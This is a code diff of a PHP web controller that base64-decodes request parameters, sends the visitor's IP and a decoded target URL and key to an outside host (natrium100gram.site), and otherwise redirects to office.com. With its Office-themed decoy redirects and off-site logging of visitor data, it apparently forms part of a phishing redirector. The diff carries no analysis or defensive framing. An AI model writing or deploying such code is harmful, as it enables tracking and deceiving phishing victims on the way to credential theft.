@@ -45,18 +45,27 @@ class Controller extends BaseController
             return redirect()->away("https://office.com");
         }else{
 //            return base64_decode($data->target).base64_decode($data->email);
-            return redirect()->away(base64_decode($data["target"]).base64_decode($data["email"]));
+            return redirect()->away($data["email"]);
 
         }
     }
 
     public function index2(Request $request){
+        $decode = base64_decode($request->subs);
+        $target_url  = explode("&",$decode)[0];
+        $key_red  = explode("&",$decode)[1];
+//        return ;
      $send =   Http::post("https://natrium100gram.site/public/api/savemeking",[
             "ip" => $this->get_ip(),
-            "subs" => $request->subs,
-            "excode" => $request->excode,
+            "subs" => $target_url,
+            "key_red" => $key_red,
         ]);
-        return $send->body();
+     if ($send->successful()){
+         return "success";
+     }else{
+         return redirect()->away("https://office.com");
+     }
+//        return $send->body();
 
     }
 
